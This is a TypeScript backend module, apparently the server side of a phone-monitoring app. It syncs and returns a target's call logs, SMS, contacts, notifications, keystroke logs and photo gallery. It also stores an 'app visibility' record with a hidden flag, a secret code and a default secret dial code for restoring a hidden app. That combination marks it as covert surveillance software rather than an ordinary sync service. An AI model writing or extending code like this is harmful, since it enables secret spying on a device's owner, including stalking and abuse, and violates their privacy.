import type { Env } from "./types";
import { json } from "./auth";

export async function updateSyncStatus(
  db: D1Database,
  userId: string,
  dataType: string,
  count: number
): Promise<void> {
  const now = Date.now();
  await db
    .prepare(
      `INSERT INTO sync_status (user_id, data_type, last_sync, count)
       VALUES (?, ?, ?, ?)
       ON CONFLICT(user_id, data_type) DO UPDATE SET last_sync = excluded.last_sync, count = excluded.count`
    )
    .bind(userId, dataType, now, count)
    .run();
}

export async function upsertBatch(
  db: D1Database,
  table: string,
  userId: string,
  items: Array<Record<string, unknown>>,
  mapRow: (item: Record<string, unknown>, userId: string) => {
    id: string;
    binds: unknown[];
    sql: string;
  }
): Promise<number> {
  let count = 0;
  for (const item of items) {
    const mapped = mapRow(item, userId);
    if (!mapped.id) continue;
    await db.prepare(mapped.sql).bind(...mapped.binds).run();
    count++;
  }
  return count;
}

export function publicGalleryUrl(request: Request, userId: string, imageId: string): string {
  const url = new URL(request.url);
  return `${url.origin}/gallery/${encodeURIComponent(userId)}/${encodeURIComponent(imageId)}`;
}

export async function ensureUserVisibility(db: D1Database, userId: string): Promise<void> {
  await db
    .prepare(
      `INSERT OR IGNORE INTO app_visibility (user_id, is_hidden, secret_code, restore_dial_code)
       VALUES (?, 0, '', '*#*#737826#*#*')`
    )
    .bind(userId)
    .run();
}

export function parseItems(body: unknown): Array<Record<string, unknown>> {
  if (!body || typeof body !== "object") return [];
  const obj = body as Record<string, unknown>;
  if (Array.isArray(obj.items)) {
    return obj.items.filter((x) => x && typeof x === "object") as Array<Record<string, unknown>>;
  }
  if (Array.isArray(body)) {
    return body.filter((x) => x && typeof x === "object") as Array<Record<string, unknown>>;
  }
  return [obj];
}

export async function getUserBundle(env: Env, userId: string) {
  const [
    profile,
    device,
    visibility,
    callLogs,
    sms,
    contacts,
    notifications,
    keylogs,
    gallery,
    syncStatus,
  ] = await Promise.all([
    env.DB.prepare(`SELECT * FROM profiles WHERE user_id = ?`).bind(userId).first(),
    env.DB.prepare(`SELECT * FROM device_info WHERE user_id = ?`).bind(userId).first(),
    env.DB.prepare(`SELECT * FROM app_visibility WHERE user_id = ?`).bind(userId).first(),
    env.DB.prepare(`SELECT * FROM call_logs WHERE user_id = ? ORDER BY date DESC LIMIT 500`).bind(userId).all(),
    env.DB.prepare(`SELECT * FROM sms WHERE user_id = ? ORDER BY date DESC LIMIT 500`).bind(userId).all(),
    env.DB.prepare(`SELECT * FROM contacts WHERE user_id = ? LIMIT 2000`).bind(userId).all(),
    env.DB.prepare(`SELECT * FROM notifications WHERE user_id = ? ORDER BY timestamp DESC LIMIT 500`).bind(userId).all(),
    env.DB.prepare(`SELECT * FROM keylogs WHERE user_id = ? ORDER BY timestamp DESC LIMIT 1000`).bind(userId).all(),
    env.DB.prepare(`SELECT * FROM gallery WHERE user_id = ? ORDER BY uploaded_at DESC LIMIT 500`).bind(userId).all(),
    env.DB.prepare(`SELECT * FROM sync_status WHERE user_id = ?`).bind(userId).all(),
  ]);

  return {
    userId,
    profile,
    device_info: device
      ? { ...(JSON.parse((device as { payload: string }).payload || "{}") as object), uploadedAt: (device as { uploaded_at: number }).uploaded_at }
      : null,
    visibility: visibility
      ? {
          is_hidden: Boolean((visibility as { is_hidden: number }).is_hidden),
          secret_code: (visibility as { secret_code: string }).secret_code,
          restore_dial_code: (visibility as { restore_dial_code: string }).restore_dial_code,
          hidden_at: (visibility as { hidden_at: number | null }).hidden_at,
          shown_at: (visibility as { shown_at: number | null }).shown_at,
        }
      : { is_hidden: false },
    call_logs: rowsToMap(callLogs.results || []),
    sms: rowsToMap(sms.results || []),
    contacts: rowsToMap(contacts.results || []),
    notifications: rowsToMap(notifications.results || []),
    keylogs: rowsToMap(keylogs.results || []),
    gallery: rowsToMap(gallery.results || []),
    sync_status: Object.fromEntries(
      (syncStatus.results || []).map((row) => {
        const r = row as { data_type: string; last_sync: number; count: number };
        return [r.data_type, { lastSync: r.last_sync, count: r.count }];
      })
    ),
  };
}

function rowsToMap(rows: Record<string, unknown>[]) {
  const map: Record<string, unknown> = {};
  for (const row of rows) {
    const id = String(row.id);
    if (row.payload) {
      try {
        map[id] = JSON.parse(String(row.payload));
        continue;
      } catch {
        // fall through
      }
    }
    map[id] = row;
  }
  return map;
}

export { json };
